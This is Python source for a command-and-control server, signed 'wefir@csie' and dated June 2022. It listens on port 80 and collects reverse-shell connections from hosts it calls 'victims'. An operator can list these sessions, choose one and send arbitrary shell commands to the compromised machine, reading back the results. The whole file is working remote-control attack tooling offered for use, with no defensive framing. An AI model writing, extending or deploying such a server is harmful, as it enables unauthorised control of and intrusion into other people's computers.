import socket,os
import threading
from colorama import *
init()
CMD = ""
index = 0
shell = False
SERVER_HOST = "0.0.0.0"
SERVER_PORT = 80
BUFFER = 1024 * 128 
victim_sockets = []
victim_address = []
victim_host = []
banner = '''
:'######:::'#######::'##::::'##:'##::::'##::::'###::::'##::: ##:'########::::::::'###::::'##::: ##:'########::
'##... ##:'##.... ##: ###::'###: ###::'###:::'## ##::: ###:: ##: ##.... ##::::::'## ##::: ###:: ##: ##.... ##:
 ##:::..:: ##:::: ##: ####'####: ####'####::'##:. ##:: ####: ##: ##:::: ##:::::'##:. ##:: ####: ##: ##:::: ##:
 ##::::::: ##:::: ##: ## ### ##: ## ### ##:'##:::. ##: ## ## ##: ##:::: ##::::'##:::. ##: ## ## ##: ##:::: ##:
 ##::::::: ##:::: ##: ##. #: ##: ##. #: ##: #########: ##. ####: ##:::: ##:::: #########: ##. ####: ##:::: ##:
 ##::: ##: ##:::: ##: ##:.:: ##: ##:.:: ##: ##.... ##: ##:. ###: ##:::: ##:::: ##.... ##: ##:. ###: ##:::: ##:
. ######::. #######:: ##:::: ##: ##:::: ##: ##:::: ##: ##::. ##: ########::::: ##:::: ##: ##::. ##: ########::
:......::::.......:::..:::::..::..:::::..::..:::::..::..::::..::........::::::..:::::..::..::::..::........:::
:'######:::'#######::'##::: ##:'########:'########:::'#######::'##:::::::
'##... ##:'##.... ##: ###:: ##:... ##..:: ##.... ##:'##.... ##: ##:::::::
 ##:::..:: ##:::: ##: ####: ##:::: ##:::: ##:::: ##: ##:::: ##: ##:::::::
 ##::::::: ##:::: ##: ## ## ##:::: ##:::: ########:: ##:::: ##: ##:::::::
 ##::::::: ##:::: ##: ##. ####:::: ##:::: ##.. ##::: ##:::: ##: ##:::::::
 ##::: ##: ##:::: ##: ##:. ###:::: ##:::: ##::. ##:: ##:::: ##: ##:::::::          made by wefir@csie
. ######::. #######:: ##::. ##:::: ##:::: ##:::. ##:. #######:: ########:          2022.June
:......::::.......:::..::::..:::::..:::::..:::::..:::.......:::........::

'''
def help():

    print('''
                Available Commands:
                                    help:Show this help menu.
                                    list:Lists connected hosts, along with the session id.
                                    use <id>:Open a shell session with a selected host.
                                    quit:Exit the program.
                                    remove <id>:Forcibly removes a dead socket(Do Not try on live connections!)
                ''')

def colored(r, g, b, text):
    return f"\033[38;2;{r};{g};{b}m{text}\033[38;2;255;255;255m"
def print_banner():
    global banner
    colortext = colored(245, 147, 27,banner)
    print(colortext,end = "")


def listener():
    global SERVER_HOST,SERVER_PORT,BUFFER,client_socket, client_address
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((SERVER_HOST, SERVER_PORT))
    s.listen(5)
    #print("[+]Listening for connections...")
    # accept any connections attempted
    client_socket, client_address = s.accept()
    host = client_socket.recv(1024).decode()
    victim_sockets.append(client_socket)
    victim_address.append(client_address)
    victim_host.append(host)
    print(Style.BRIGHT + Fore.CYAN+"\n[+]Acquired new host:"+ host+" , "+client_address[0]+":"+str(client_address[1])+Style.RESET_ALL)
    #print(f"{client_address[0]}:{client_address[1]} Connected!")

def listhosts():
    global victim_address,victim_sockets
    print(" "*8+"SessionID"+" "*8+"IP"+" "*16+"Hostname")
    print(" "*8+"="*50)
    for i in range(len(victim_sockets)):
        print(" "*8+str(i)+" "*(7+len("SessionID"))+victim_address[i][0]+" "*8+victim_host[i])

def C2():
    global shell,CMD,BUFFER,client_socket, client_address,index
    while True:
        print(Style.BRIGHT + Fore.RED +"C2>"+Style.RESET_ALL,end = "")
        CMD = input()
        if CMD != "":
            if (CMD.split())[0] == "use":
                index = int((CMD.split())[1])
                shell = True
            if(CMD.split())[0] == "remove":
                index = int((CMD.split())[1])
                try:
                    victim_sockets[index].close()
                except:
                    None
                victim_sockets.remove(victim_sockets[index])
                victim_address.remove(victim_address[index])
                victim_host.remove(victim_host[index])    
            elif CMD == "quit":
                exit()
                
            elif CMD == "help":
                help()
            elif CMD == "list":
                listhosts()
            elif CMD == "clear" or CMD == "cls":
                os.system("cls")
        
            else:
                print(CMD+"[+]Invalid Command.Try typing 'help'")
        while shell:            
            print(Style.BRIGHT + Fore.GREEN+"shell$"+Style.RESET_ALL,end="")
            CMD = input()
            if CMD != "":
                try:
                    victim_sockets[index].send(CMD.encode())
                    output = victim_sockets[index].recv(BUFFER).decode()
                    print('\n'+output)
                except:
                    print("[!]Network error.Target is offline")
                    victim_sockets.remove(victim_sockets[index])
                    victim_address.remove(victim_address[index])
                    victim_host.remove(victim_host[index])
                    break
                if CMD == "exit":
                    victim_sockets.remove(victim_sockets[index])
                    victim_address.remove(victim_address[index])
                    victim_host.remove(victim_host[index])
                    shell = False
                    break
                elif CMD == "cls" or CMD == "clear":
                    os.system("cls")

print_banner()
help()
print(Style.BRIGHT + Fore.CYAN+"[+]Listening for connections on "+SERVER_HOST+":"+str(SERVER_PORT) + Style.RESET_ALL)
while True:
    thread = threading.Thread(target=C2,args=())
    thread.start()
    listener()



